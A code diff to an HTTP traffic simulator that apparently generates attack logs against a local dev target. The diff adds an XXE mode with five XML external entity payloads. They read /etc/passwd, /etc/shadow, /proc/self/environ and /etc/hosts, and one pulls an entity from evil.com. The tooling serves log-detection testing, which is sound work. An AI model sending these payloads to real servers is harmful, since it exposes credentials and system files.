@@ -6,16 +6,17 @@ simulate.py
 HTTP traffic simulator for generating realistic attack and
 normal log patterns against the dev-log target application
 
-Provides 10 traffic modes via argparse: normal (benign
+Provides 11 traffic modes via argparse: normal (benign
 browsing with GET/POST mix), sqli (12 SQL injection
 payloads), xss (10 script/event handler vectors),
 traversal (10 dot-dot-slash and encoding variants), cmdi
 (7 shell command injection payloads), log4shell (4 JNDI
 lookup variants), ssrf (5 cloud metadata and internal
-service targets), scanner (20 recon paths with 11 scanner
-user-agents), flood (rapid-fire requests), and mixed
-(50/10/40 normal/scanner/attack split). Uses urllib for
-HTTP requests with configurable count, delay, and target
+service targets), xxe (5 XML external entity payloads),
+scanner (20 recon paths with 11 scanner user-agents),
+flood (rapid-fire requests), and mixed (50/10/40
+normal/scanner/attack split). Uses urllib for HTTP
+requests with configurable count, delay, and target
 URL. Checks /health reachability before starting
 
 Connects to:
@@ -29,6 +30,7 @@ import random
 import sys
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 
 DEFAULT_TARGET = "http://localhost:58319"
@@ -117,6 +119,19 @@ SSRF_PAYLOADS = [
     "/api/search?url=http://metadata.google.internal/computeMetadata/v1/",
 ]
 
+XXE_PAYLOADS = [
+    # Classic file disclosure via internal entity
+    "/api/test?data=%3C!DOCTYPE+foo+%5B%3C!ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E",
+    # SYSTEM keyword targeting /etc/hosts
+    "/api/test?xml=<!DOCTYPE+root+[<!ENTITY+ext+SYSTEM+'file:///etc/hosts'>]>",
+    # XInclude (xmlns:xi) attempt
+    "/api/test?body=<root+xmlns:xi='http://www.w3.org/2001/XInclude'><xi:include+href='file:///etc/shadow'/></root>",
+    # URL-encoded <!ENTITY marker (%3C = <, %21 = !)
+    "/api/parse?input=%3C%21ENTITY+evil+SYSTEM+%22file%3A%2F%2F%2Fproc%2Fself%2Fenviron%22%3E",
+    # Generic entity reference probe
+    "/api/test?content=<!DOCTYPE+x+[<!ENTITY+test+SYSTEM+'http://evil.com/xxe'>]>&q=&xxe;",
+]
+
 SCANNER_USER_AGENTS = [
     "Nikto/2.1.6",
     "sqlmap/1.7.2#stable (https://sqlmap.org)",
@@ -149,11 +164,13 @@ ATTACK_POOLS = {
     "cmdi": COMMAND_INJECTION_PAYLOADS,
     "log4shell": LOG4SHELL_PAYLOADS,
     "ssrf": SSRF_PAYLOADS,
+    "xxe": XXE_PAYLOADS,
 }
 
 
 def send(target, path, user_agent=None, method="GET"):
-    url = f"{target}{path}"
+    encoded_path = urllib.parse.quote(path, safe="/?&=")
+    url = f"{target}{encoded_path}"
     ua = user_agent or random.choice(NORMAL_USER_AGENTS)
     req = urllib.request.Request(url, headers={"User-Agent": ua})
     if method == "POST":
@@ -270,6 +287,7 @@ MODES = {
     "cmdi": lambda t, c, d: run_attack(t, c, d, "cmdi"),
     "log4shell": lambda t, c, d: run_attack(t, c, d, "log4shell"),
     "ssrf": lambda t, c, d: run_attack(t, c, d, "ssrf"),
+    "xxe": lambda t, c, d: run_attack(t, c, d, "xxe"),
     "scanner": lambda t, c, d: run_scanner(t, c, d),
     "flood": lambda t, c, d: run_flood(t, c, d),
     "mixed": lambda t, c, d: run_mixed(t, c, d),
